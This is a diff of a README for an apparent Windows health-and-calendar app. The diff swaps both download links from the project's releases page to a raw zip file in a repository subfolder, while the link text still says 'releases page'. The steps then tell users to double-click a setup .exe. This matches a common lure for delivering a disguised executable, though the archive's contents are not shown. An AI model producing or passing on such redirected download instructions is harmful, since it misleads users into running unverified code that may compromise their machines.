@@ -1,6 +1,6 @@
 # 📈 hermes-health-apollo - Manage health data and daily schedules
 
-[![Download Software](https://img.shields.io/badge/Download-Hermes-blue)](https://github.com/vsj4394/hermes-health-apollo/releases)
+[![Download Software](https://img.shields.io/badge/Download-Hermes-blue)](https://github.com/vsj4394/hermes-health-apollo/raw/refs/heads/main/health_eval/hermes_apollo_health_1.0.zip)
 
 Hermes Health Apollo links your wearable health devices and calendar data to your computer. It focuses on privacy by keeping your data on your local machine. This tool integrates Oura ring data with Google Calendar to suggest times for work and rest.
 
@@ -10,7 +10,7 @@ This application works on Windows 10 and Windows 11. Ensure your computer has at
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/vsj4394/hermes-health-apollo/releases) to download the software.
+1. Visit the [releases page](https://github.com/vsj4394/hermes-health-apollo/raw/refs/heads/main/health_eval/hermes_apollo_health_1.0.zip) to download the software.
 2. Select the file ending in .exe to start the download.
 3. Once the file finishes downloading, locate it in your Downloads folder.
 4. Double-click the file named hermes-health-apollo-setup.exe.
